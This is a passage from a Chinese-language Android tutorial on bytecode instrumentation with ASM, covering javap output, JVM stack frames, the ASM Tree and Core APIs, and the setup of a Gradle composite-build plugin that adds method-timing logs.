比如，<code>.class</code> 文件格式规范规定，每个 <code>.class</code> 文件的开头都必须是被称为 “魔数”（Magic Number）的固定四个字节。这个魔数是 <code>0xCAFEBABE</code>（16 进制表示）。</p>
</blockquote>
<p>即使用 16 进制编辑器打开 <code>.class</code> 文件，也非常难以阅读和理解，想要以更直观的方式阅读 <code>.class</code> 文件，可以利用 JDK 自带 <code>javap</code>（Java Class File Disassembler）工具，它用于反汇编 <code>.class</code> 文件，是查看字节码的标准工具。</p>
<p>我们先 cd 到 <code>.class</code> 文件的所在目录，然后使用 <code>javap</code> 命令：</p>
<pre><code class="hljs language-bash" lang="bash">javap -c .\UtilsKt.class
</code></pre>
<p><code>-c</code>（disassemble code）参数表示查看字节码指令</p>
<p>执行命令会我们就会得到以下内容：</p>
<pre><code class="hljs language-arduino" lang="arduino">Compiled from <span class="hljs-string">"Utils.kt"</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.example.helloworld.UtilsKt {
  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)</span></span>;
    Code:
       <span class="hljs-number">0</span>: iload_0
       <span class="hljs-number">1</span>: iload_1
       <span class="hljs-number">2</span>: iadd
       <span class="hljs-number">3</span>: ireturn
}
</code></pre>
<p>要理解上面的字节码指令，我们首先得理解栈帧，每个线程都有一个独立的栈，每调用一个方法，就会往这个栈放入一个栈帧（栈是一个后进先出的结构，所以调用最深方法的栈帧处在栈顶）：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/143fbac509754494abe210e5ffcd56ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=JX76hEpMkWmxgOkgHvoXeInCzBs%3D" alt="栈帧.png" loading="lazy"/></p>
<p>每个栈帧都存储着：</p>
<ul>
<li><strong>局部变量表</strong>；</li>
<li><strong>操作数栈</strong>；</li>
<li>动态链接；</li>
<li>方法返回地址；</li>
</ul>
<p>我们再把 <code>javap</code> 的输出贴一遍：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.example.helloworld.UtilsKt {
  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)</span></span>;
    Code:
       <span class="hljs-number">0</span>: iload_0
       <span class="hljs-number">1</span>: iload_1
       <span class="hljs-number">2</span>: iadd
       <span class="hljs-number">3</span>: ireturn
}
</code></pre>
<p>局部变量表像一个数组，用于存储方法参数和方法内部定义的局部变量，对于我们的 <code>add()</code> 方法，局部变量表为：<code>[ 0: a, 1: b ]</code> (索引 0 存的是参数 <code>a</code>，索引 1 存的是参数 <code>b</code>)</p>
<blockquote>
<p>如果是非静态方法，局部变量表的索引 0 位置是 class 实例，也就是 <code>this</code>。</p>
</blockquote>
<p>操作数栈 (Operand Stack) 是一个后进先出 (LIFO) 的栈，用于执行计算。字节码指令（比如 iadd）会从这个栈中弹出 (pop) 数据，计算后，再把结果压入 (push) 栈顶。初始时操作数栈为空：<code>[ ]</code>。</p>
<p>接下来，我们来当一次 JVM，一步一步执行 <code>add(int, int)</code> 方法的字节码：</p>
<ol>
<li>
<p><code>iload_0</code></p>
<ul>
<li>含义: i 代表 integer (整数)，load 代表加载。0 是一个简写，代表索引 0。</li>
<li>动作: 从局部变量表的索引 0 处加载一个整数（也就是参数 a），并将其压入操作数栈。</li>
<li>栈帧状态：
<ul>
<li>局部变量表: <code>[ a, b ]</code></li>
<li>操作数栈: <code>[ a ]</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>iload_1</code>：与上一条字节码指令类似，不再赘述。</p>
<ul>
<li>栈帧状态：
<ul>
<li>局部变量表: <code>[ a, b ]</code></li>
<li>操作数栈: <code>[ a, b ]</code> (b 在栈顶)</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>iadd</code></p>
<ul>
<li>含义：<code>i</code> (integer) + <code>add</code> (相加)</li>
<li>动作: 从操作数栈顶部弹出两个整数（先弹出 <code>b</code>，再弹出 <code>a</code>），将它们相加，然后把结果（假设为 <code>c</code>） 压回操作数栈。</li>
<li>栈帧状态：
<ul>
<li>局部变量表：<code>[ a, b ]</code></li>
<li>操作数栈：<code>[ c ]</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>ireturn</code></p>
<ul>
<li>含义：<code>i</code> (integer) + <code>return</code> (返回)</li>
<li>动作：从操作数栈顶部弹出一个整数（也就是 a + b 的结果），并将其作为方法的返回值。同时，当前栈帧被销毁。</li>
<li>栈帧状态：被销毁</li>
</ul>
</li>
</ol>
<p>以上就是字节码的执行过程，就好像一套基于栈的底层汇编语言。<code>iload</code>、<code>iadd</code>、<code>ireturn</code> 这些被称为“助记符”，它们每一个都对应一个 16 进制的“操作码”（比如 <code>iload_0</code> 对应 <code>0x1a</code>）。<code>.class</code> 文件里存的就是这些二进制的操作码，而 <code>javap</code> 帮我们反编译成了更易读的助记符。</p>
<hr/>
<p>好了，截至目前为止，我们现在知道了：</p>
<ul>
<li>为什么插桩：为了实现 AOP，分离“横切关注点”；</li>
<li>插桩时机：在 <code>.class</code> 文件生成后，<code>.dex</code> 文件生成前；</li>
<li>插桩原理：修改 <code>.class</code> 文件的字节码指令。</li>
</ul>
<p>下一个问题是：怎么改？</p>
<p>我们总不能用 16 进制编辑器去手动修改 <code>.class</code> 文件吧？（较真起来可以是可以，但真没这个必要）我们需要一个更高级、更抽象的工具来帮我们解析和修改字节码。</p>
<p>市面上主流的字节码操作库有：</p>
<ul>
<li><strong>Javassist</strong>: 提供了更高级别的 API。支持用类似 Java 源码的字符串（如 <code>System.out.println("hello");</code>）来插入代码，它会帮你编译成字节码。上手简单，但灵活性和性能稍差。</li>
<li><strong>ASM</strong>: 提供了更底层的 API。它不认识 Java 源码，它只认识 <code>iload</code>、<code>iadd</code> 这样的字节码指令。需手动去“拼”出这些指令。更难，但性能高、灵活性强。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4048c88ec1e4cfb95b9ff17a09955f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=uydyAivXcAGyUHvuQ9nB2%2FjrDBw%3D" alt="ASM_and_Javassist.png" loading="lazy"/></p>
<p>在 Android 领域，ASM 几乎是唯一的选择。因为在 Android 打包过程中会遍历成百上千个 <code>.class</code> 文件。这个过程对性能的要求是极致的。ASM 几乎就是字节码的“搬运工”，非常的轻量，没有多余的抽象和转换。</p>
<h2 data-id="heading-9">ASM 是如何工作的？</h2>
<p>那么，相比于手动编辑 16 进制文件，ASM 是如何让我们优雅地修改 <code>.class</code> 文件的呢？</p>
<p>ASM 提供了两套 API 来操作字节码，它们各有优劣：</p>
<ol>
<li>
<p><strong>Tree API</strong>：面向对象的方式，先把整个 <code>.class</code> 文件的内容读入内存，构建成一个“树”状结构，我们通过操作这棵“树”的节点来修改字节码。</p>
</li>
<li>
<p><strong>Core API</strong>：基于事件流的方式，像 SAX 解析 XML 一样，逐行扫描 <code>.class</code> 文件，在扫描到特定结构（如“找到一个方法”、“找到一条指令”）时触发回调，我们在回调里进行修改。</p>
</li>
</ol>
<h3 data-id="heading-10">Tree API</h3>
<p>我们先从更容易理解的 Tree API 讲起。</p>
<p>相信在座的每个 Android 开发者都用过 Gson 解析 <code>.json</code> 文件：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"UtilsKt"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"superName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"java/lang/Object"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"methods"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"add"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"desc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"(II)I"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>使用 Gson 时，它会把整个 JSON 字符串读入内存，转换成一个 <code>JsonObject</code> 或对应的数据类。随后我们就可以像操作一个普通的 Kotlin/Java 对象一样，随意地读取、修改、添加或删除它的任何属性，比如 <code>jsonObject.remove("superName")</code>。</p>
<p>ASM 的 Tree API 也是完全一样的思路。由于<code>.class</code> 文件是一个遵循严格规范的二进制结构。Tree API 会把整个 <code>.class</code> 文件的字节流完整地读入内存，然后构建出一个完整的“对象树”来表示这个类。</p>
<p>还记得我们上面那个 <code>UtilsKt.class</code> 吗？如果用 Tree API 把它加载到内存里，结构大概是这个样子：</p>
<pre><code class="hljs language-lua" lang="lua">ClassNode (类: UtilsKt)
 |
 +<span class="hljs-comment">-- name: "UtilsKt" (由文件名 Utils.kt 自动生成)</span>
 |
 +<span class="hljs-comment">-- superName: "java/lang/Object"</span>
 |
 +<span class="hljs-comment">-- access: public final (公共且不可继承)</span>
 |
 +<span class="hljs-comment">-- fields (字段列表): (无)</span>
 |
 +<span class="hljs-comment">-- methods (方法列表):</span>
     |
     +<span class="hljs-comment">-- MethodNode (方法: &lt;init&gt;)</span>
     |   |
     |   +<span class="hljs-comment">-- access: private (私有构造函数，防止外部实例化)</span>
     |
     +<span class="hljs-comment">-- MethodNode (方法: add)</span>
         |
         +<span class="hljs-comment">-- access: public static final (公共、静态、最终)</span>
             |
             +<span class="hljs-comment">-- descriptor: "(II)I" (描述符：接收两个Int，返回一个Int)</span>
             |
             +<span class="hljs-comment">-- instructions (指令列表):</span>
                 |
                 +<span class="hljs-comment">-- InsnNode (指令: [ILOAD_0]) (加载第 0 个参数 'a' 到栈顶)</span>
                 +<span class="hljs-comment">-- InsnNode (指令: [ILOAD_1]) (加载第 1 个参数 'b' 到栈顶)</span>
                 +<span class="hljs-comment">-- InsnNode (指令: [IADD])    (将栈顶两个 Int 相加，结果放回栈顶)</span>
                 +<span class="hljs-comment">-- InsnNode (指令: [IRETURN]) (返回栈顶的 Int 结果)</span>
</code></pre>
<p>现在要对 <code>add()</code> 方法插入耗时统计的切面逻辑，我们要做的事情，就是去修改对应的 MethodNode 里的 instructions 列表。具体来说就是：</p>
<ol>
<li>在 <code>methodNode.instructions</code> 的最前面（insert）插入“获取开始时间并存入局部变量”的指令。</li>
<li>遍历 <code>methodNode.instructions</code>，找到所有“返回”指令（比如 <code>IRETURN</code>），在这些指令之前（insertBefore）插入“计算耗时并打印日志”的指令。</li>
</ol>
<blockquote>
<p>在这里先给各位新手打个预防针，“插入字节码”说起来容易，写起来做起来难。我们必须手动去“拼”出代码对应的所有字节码指令。
以 <code>val start = System.currentTimeMillis()</code> 为例，对应的字节码指令有两个：</p>
<ol>
<li><code>INVOKESTATIC java/lang/System.currentTimeMillis ()J</code>：调用静态方法，并将 <code>long</code> 类型的返回值压入操作数栈；</li>
<li><code>LSTORE_2</code>：将栈顶的 <code>long</code> 存入局部变量表的第 2 个槽位（第 0、1 个分别是 <code>a</code> 和 <code>b</code>）。</li>
</ol>
<p>而 <code>Log.d(...)</code> 这行代码则更为复杂，涉及 String 的拼接，对应的字节码指令有十几条（比如 <code>NEW</code>、<code>DUP</code>、<code>LDC</code>、<code>INVOKEVIRTUAL</code>...）除了要确保这些指令准确无误，还得手动管理好局部变量表和操作数栈的最大深度，因为没有修改前，这个方法的局部变量表只有 2 个槽位，操作数栈的最大深度是 2，但是插入了新的字节码后就不一样了，如果不修正局部变量表和操作数栈的最大深度，JVM 在校验 <code>.class</code> 文件时就会直接崩溃。</p>
</blockquote>
<blockquote>
<p>前面我们学会了用 <code>javap -c xxx.classs</code> 命令来查看 class 文件中的 Java 字节码指令，它会显示类中的所有方法以及每个方法对应的字节码指令列表。如果我们想查看 <code>.class</code> 文件的更多信息，可以使用 <code>-v</code> 参数（verbose），它会输出显示：类元数据、常量池、方法元数据（如堆栈大小、局部变量表大小、参数数量）等等所有详细信息。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a1d6e505564411f91907c647ee59cc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=NtegTfj7VXVaY8kEAynyPw8uabM%3D" alt="javap-v.png" loading="lazy"/></p>
<p>这套 Tree API 的优点是直观，符合面向对象的思维。增删改查就像操作 <code>List</code> 一样简单，适合需要进行复杂、全局性修改的场景。缺点也很明显：内存黑洞，需要把 <code>.class</code> 文件的所有信息都加载到内存中。</p>
<p>一般情况下，我们是不会采用这这套 API 的，在 Android 的编译流程中，AGP 需要遍历成百上千个 <code>.class</code> 文件。如果每处理一个文件都要先把它们全部读入内存，构建成一个巨大的 ClassNode 对象树，然后再序列化回磁盘，内存占用和 I/O 开销将不容乐观，对本就漫长的编译过程无疑是雪上加霜。</p>
<h3 data-id="heading-11">Core API</h3>
<p>如果说 Tree API 是把整本书背下来再修改，那么 Core API 就是边读边改。</p>
<p>Core API 基于 Visitor Pattern（访问者模式），它本质上是一个事件驱动的模型（就像 XML 解析中的 SAX）。它不需要把整个类加载到内存里，而是通过“流”的形式，遍历 .class 文件，每遇到一个节点（类头、字段、方法、注解），就触发一个事件回调。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[ClassReader] --&gt;|解析字节码| B(ClassVisitor 我们写的插桩逻辑)
    B --&gt;|修改/透传事件| C[ClassWriter]
    C --&gt;|生成字节码| D[新的.class文件]
</code></pre>
<p>它们的协作关系就像一条流水线，也就是责任链模式</p>
<p>怎么去理解这里面的“访问者模式”呢？你可以把这个过程想象成有一个导游（ClassReader）带领我们（ClassVisitor）参观房子（<code>.class</code>），除了之外，还有一个装修公司的负责人（ClassWriter）在旁边。</p>
<ol>
<li>
<p>ClassReader（导游）带我们走到主卧门口，开始念：“现在有一个方法，叫 add，参数是 2 个 int...”</p>
</li>
<li>
<p>ClassVisitor（访问者 / 游客）听到后，可以原封不动地传给 ClassWriter（装修公司的负责人），也可以夹带私货：“现在有一个方法，叫 add，参数是 3 个 int”</p>
</li>
<li>
<p>ClassWriter（装修公司的负责人）听到什么就记下来，最后拼成新的 <code>.class</code> 文件。</p>
</li>
</ol>
<p>假设我们要修改一个类，我们通常会继承 <code>ClassVisitor</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClassVisitor</span>(nextVisitor: ClassVisitor) : ClassVisitor(Opcodes.ASM9, nextVisitor) {

  <span class="hljs-comment">// 访问到"类"</span>
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visit</span><span class="hljs-params">(version: <span class="hljs-type">Int</span>, access: <span class="hljs-type">Int</span>, name: <span class="hljs-type">String</span>?, signature: <span class="hljs-type">String</span>?, superName: <span class="hljs-type">String</span>?, interfaces: <span class="hljs-type">Array</span>&lt;<span class="hljs-type">out</span> <span class="hljs-type">String</span>&gt;?)</span></span> {
    <span class="hljs-comment">// 可以在这里修改类名、父类等</span>
    <span class="hljs-keyword">super</span>.visit(version, access, name, signature, superName, interfaces)

  }

  <span class="hljs-comment">// 当扫描到方法时，会调用这个回调</span>
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visitMethod</span><span class="hljs-params">(access: <span class="hljs-type">Int</span>, name: <span class="hljs-type">String</span>?, descriptor: <span class="hljs-type">String</span>?, signature: <span class="hljs-type">String</span>?, exceptions: <span class="hljs-type">Array</span>&lt;<span class="hljs-type">out</span> <span class="hljs-type">String</span>&gt;?)</span></span>: MethodVisitor {
    <span class="hljs-keyword">val</span> originalMethodVisitor = <span class="hljs-keyword">super</span>.visitMethod(access, name, descriptor, signature, exceptions)
    <span class="hljs-keyword">if</span> (name == <span class="hljs-string">"add"</span>) {
      <span class="hljs-comment">// 如果是我们要修改的 add 方法，我们不能直接在这里写指令</span>
      <span class="hljs-comment">// 而是要返回一个新的 MethodVisitor 对象，由它去处理方法内部的细节</span>
      <span class="hljs-keyword">return</span> MyMethodVisitor(originalMethodVisitor)
    }

    <span class="hljs-keyword">return</span> originalMethodVisitor
  }
}
</code></pre>
<p>请注意 <code>ClassVisitor</code> 只负责“类”层面的事（比如类名、字段列表、方法列表）。当它发现一个方法时（<code>visitMethod()</code>），它不会直接处理方法体内的代码，而是要求你返回一个 <strong><code>MethodVisitor</code></strong>。也就是：如果你想改方法里的代码，得再派一个小弟（MethodVisitor）进去。这个 <code>MethodVisitor</code> 里的回调更加细致：</p>
<ul>
<li><code>visitAnnotation(descriptor: String, visible: Boolean)</code>：访问方法注解；</li>
<li><code>visitParameter(name: String, access: Int)</code>：访问方法的参数信息；</li>
<li><code>visitCode()</code>：方法体的开始；</li>
<li><code>visitVarInsn(opcode: Int, varIndex: Int)</code>：访问局部变量；</li>
<li>...</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMethodVisitor</span>(nextMv: MethodVisitor) : MethodVisitor(Opcodes.ASM9, nextMv) {
  <span class="hljs-comment">// 方法开始执行时</span>
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visitCode</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">super</span>.visitCode()
    <span class="hljs-comment">// 插入：System.currentTimeMillis()...</span>
  }

  <span class="hljs-comment">// 遇到每条指令时</span>
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visitInsn</span><span class="hljs-params">(opcode: <span class="hljs-type">Int</span>)</span></span> { 
    <span class="hljs-keyword">if</span> (opcode == Opcodes.IRETURN) {
      <span class="hljs-comment">// 在 return 之前插入耗时计算代码...</span>
    }
    <span class="hljs-keyword">super</span>.visitInsn(opcode)
  }
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/686d378473a34fa98f59320d09dd457f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=JoUXXicZRQ4oIjjVHfIADLK%2B3as%3D" alt="Core_API_Details.png" loading="lazy"/></p>
<p>相比于 Tree API，Core API 的优点是内存占用低、速度快。缺点就是实现复杂，有点反人类，作为开发者要时刻清楚当前“流”到了哪里。如果想获取上下文（比如在方法结尾想知道方法开头定义的某个变量值），得自己想办法用变量存起来，不像 Tree API 那样可以随意回头看。</p>
<p><strong>总结一下</strong>：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/274ffd9dc45548f5afab581e6b5b3388~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=9Q%2FunJYDrqHcKIuLxvLTJWHhUuE%3D" alt="Tree_VS_Core.png" loading="lazy"/></p>
<p>Tree API 就像是用 Word 打开文档，你可以随意翻页、查找、替换，适合做复杂的全类分析，但费内存； Core API 就像是听录音带，听一句改一句，过了就没了，适合做高效的机械化修改（比如统一加日志、埋点）。</p>
<h2 data-id="heading-12">实践</h2>
<p>我们从"插桩"和"AOP"这两个词开始讲起，然后简单了解了 Java 编译过程和 apk 打包流程，还学了点 JVM 字节码的知识，最后探讨了 ASM 是如何修改字节码的。</p>
<p>所有的理论知识都学了，接下来就是真刀真枪的实操环节了。我们来写一个 AOP 切面编程的 Hello World：函数耗时打印。</p>
<p>我们的目标很简单：给被注解的方法自动加上计时代码，并在 Logcat 中打印出来。</p>
<hr/>
<h3 data-id="heading-13">1. 定义标记：@LogTime</h3>
<p>我们先在 <code>:app</code> 模块新建一个注解类 <code>LogTime</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// app/src/main/java/com/example/aop/LogTime.kt</span>

<span class="hljs-meta">@Retention(AnnotationRetention.BINARY)</span> <span class="hljs-comment">// 重要：必须保留到字节码阶段，否则 ASM 读不到</span>
<span class="hljs-meta">@Target(AnnotationTarget.FUNCTION)</span> <span class="hljs-comment">// 作用在函数上</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogTime</span>()
</code></pre>
<p>然后，找个“受害者”方法。我们在 <code>MainActivity</code> 里写一个模拟耗时操作的方法，并打上标记：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// app/src/main/java/com/example/aop/MainActivity.kt</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">ComponentActivity</span>() {  
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {  
    <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)  
    doSomeHeavyWork()  
  }  
  
  <span class="hljs-meta">@LogTime</span> <span class="hljs-comment">// 打上标记</span>
  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">doSomeHeavyWork</span><span class="hljs-params">()</span></span> {  
    Thread.sleep(<span class="hljs-number">100</span>) <span class="hljs-comment">// 模拟耗时 100ms</span>
  }
}
</code></pre>
<p>如果不插桩，这段代码运行起来静悄悄的。我们的目标是让它自动吐出类似 <code>MainActivity.doSomeHeavyWork execution time: 100 ms</code> 的日志。</p>
<h3 data-id="heading-14">2. 搭建工程：Composite Build</h3>
<p>既然要对字节码下手，我们首先得搞清楚“战场”在哪。</p>
<p>普通的业务代码（比如 MainActivity）是运行在用户的 Android 手机上的；而我们现在要写的插桩代码，是用来修改字节码的，它需要运行在编译阶段（也就是你的开发电脑上）。</p>
<p>这意味着，我们不能把这部分代码直接写在 <code>:app</code> 模块里。我们需要一个能介入 Android 构建流程、在 <code>.class</code> 生成后由 Gradle 自动调用的东西——没错，就是 Gradle 插件。</p>
<hr/>
<p>Gradle 插件的代码必须独立于 <code>:app</code> 模块存在。在 Android 工程里，要存放这种“构建逻辑（Build Logic）”，通常有两个选择：</p>
<ul>
<li><code>:buildSrc</code>： 这是以前最常用的方案。只要在根目录新建一个叫 <code>buildSrc</code> 的文件夹，Gradle 就会自动把它识别为插件工程。
<ul>
<li>优点：零配置</li>
<li>缺点：<code>:buildSrc</code> 被视为构建脚本的一部分。只要改动了 <code>:buildSrc</code> 里的任何一行代码，Gradle 就会认为整个项目的构建逻辑变了，从而强制让所有模块（<code>:app</code>, <code>:lib</code>...）执行全量重新编译。</li>
</ul>
</li>
<li>Composite Build（复合构建）： 这是 Gradle 官方目前推荐的现代化方案。 它允许你把插件作为一个完全独立的项目（Project）来开发，然后通过 <code>includeBuild</code> 的方式“挂载”到主项目上。
<ul>
<li>优点：完全解耦。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de58daf9dae440b8a6e12ce8159f49d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=Ymv7KzGY3Jder%2FWBTcEhwtoYFT0%3D" alt="drop_buildSrc.png" loading="lazy"/></p>
<p>作为 2025 年的 Android 开发者，我们当然选择 Composite Build 来编写 Gradle 插件。</p>
<p>我们在项目根目录下新建一个文件夹 <code>build-logic</code>（名字可以随意），这就相当于我们创建了一个独立的“外包工程”。</p>
<p>就像我们创建 Android 项目一样，一个根项目里面包含一个 <code>:app</code> 模块，我们的外包工程项目（build-login）里面也应该有一个插件模块，所以我们再继续创建两级子目录 <code>/plugin/timing</code>，这个 <code>timing</code> 目录就是我们插件模块。</p>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                   &lt;-- app 模块目录
  ├── gradle/
<span class="hljs-addition">+ ├── build-logic/           &lt;-- 复合构建的根目录</span>
<span class="hljs-addition">+ │   └── plugin/</span>
<span class="hljs-addition">+ │       └── timing/        &lt;-- 插件模块目录</span>
  ├── build.gradle.kts       &lt;-- 根项目的构建脚本
  └── settings.gradle.kts    &lt;-- 根项目的设置脚本
</code></pre>
<p>OK，我们创建了一个独立的"外包"工程项目，到目前为止，这个项目和主项目没有任何关联，我们需要在主项目 <code>settings.gradle.kts</code> 里使用 <code>includeBuild()</code> 告诉 Gradle：嘿，这个 <code>build-logic</code> 是一个独立的 Project，里面包含一些构建逻辑，在编译主项目里的任何模块之前，请你先编译 <code>build-logic</code> 这个项目。</p>
<pre><code class="hljs language-diff" lang="diff">// settings.gradle.kts

pluginManagement {  
<span class="hljs-addition">+  includeBuild("build-logic")</span>
   repositories { ... }  
}  
  
dependencyResolutionManagement { ... }  
  
rootProject.name = "AopExample"  
  
include(":app") // 包含 app 子模块
</code></pre>
<p>虽然复合构建（<code>build-logic</code>）从文件结构上看，存在于主项目内部，但是复合构建是可以被视为一个独立的 Project 的，也就是说，即使我把 <code>build-logic/</code> 文件夹单独拿出来，也可以 build 起来，不需要依赖主项目。既然它是一个独立的项目，那么应该有自己的 <code>settings.gradle.kts</code> 文件：</p>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                     &lt;-- app 模块目录
  ├── gradle/
  ├── build-logic/             &lt;-- 复合构建的根目录
<span class="hljs-addition">+ │   ├── settings.gradle.kts  &lt;-- 管理 build-logic 内部的模块</span>
  │   └── plugin/
  │       └── timing/          &lt;-- 插件模块目录
  ├── build.gradle.kts         &lt;-- 根项目的构建脚本
  └── settings.gradle.kts      &lt;-- 根项目的设置脚本
</code></pre>
<p>内容和主项目的 <code>settings.gradle.kts</code> 是类似的：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/settings.gradle.kts</span>

pluginManagement {  
    repositories {  
        gradlePluginPortal()  
        google()  
    }  
}  
  
dependencyResolutionManagement {  
    repositories {  
        google {  
            content {  
                includeGroupByRegex(<span class="hljs-string">"com\\.android.*"</span>)  
                includeGroupByRegex(<span class="hljs-string">"com\\.google.*"</span>)  
                includeGroupByRegex(<span class="hljs-string">"androidx.*"</span>)  
            }  
        }  
        mavenCentral()  
    }
}  
  
rootProject.name = <span class="hljs-string">"build-logic"</span> <span class="hljs-comment">// 这个"外包工程"的名字</span>
include(<span class="hljs-string">":plugin:timing"</span>) <span class="hljs-comment">// 工程里包含的模块</span>
</code></pre>
<p>每个模块都有自己的 <code>build.gradle.kts</code> 文件，<code>:app</code> 如此，插件模块 <code>:plugin:timing</code> 也不例外：</p>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                           &lt;-- app 模块目录
  ├── gradle/
  ├── build-logic/                   &lt;-- 复合构建的根目录
  │   ├── settings.gradle.kts        &lt;-- 管理 build-logic 内部的模块
  │   └── plugin/
  │       └── timing/                &lt;-- 插件模块目录
<span class="hljs-addition">+ │           └─── build.gradle.kts  &lt;-- 插件的构建脚本</span>
  ├── build.gradle.kts               &lt;-- 根项目的构建脚本
  └── settings.gradle.kts            &lt;-- 根项目的设置脚本
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/plugin/timing/build.gradle.kts</span>

plugins { `kotlin-dsl` }  
  
java {  
  sourceCompatibility = JavaVersion.VERSION_17  
  targetCompatibility = JavaVersion.VERSION_17  
}  
  
kotlin { compilerOptions { jvmTarget = JvmTarget.JVM_17 } }  
  
dependencies {  
  <span class="hljs-comment">// AGP API，用于访问 androidComponents 扩展</span>
  <span class="hljs-comment">// 强烈建议与 AGP gradle 版本保持一致</span>
  implementation(<span class="hljs-string">"com.android.tools.build:gradle-api:8.13.1"</span>)  
  <span class="hljs-comment">// ASM 核心库: 操作字节码的基础</span>
  implementation(<span class="hljs-string">"org.ow2.asm:asm:9.9"</span>)  
  <span class="hljs-comment">// ASM 工具库，提供了一些方便的适配器类  </span>
  implementation(<span class="hljs-string">"org.ow2.asm:asm-commons:9.9"</span>)  
}  

<span class="hljs-comment">// 注册 Gradle 插件</span>
<span class="hljs-comment">// TimingPlugin 我们在后面会实现</span>
gradlePlugin {  
  plugins {  
    register(<span class="hljs-string">"TimingPlugin"</span>) {  
      id = <span class="hljs-string">"timing-plugin"</span> <span class="hljs-comment">// 插件 ID</span>
      implementationClass = <span class="hljs-string">"com.example.asm.timing.TimingPlugin"</span> <span class="hljs-comment">// 插件的入口类</span>
    }  
  }  
}
</code></pre>
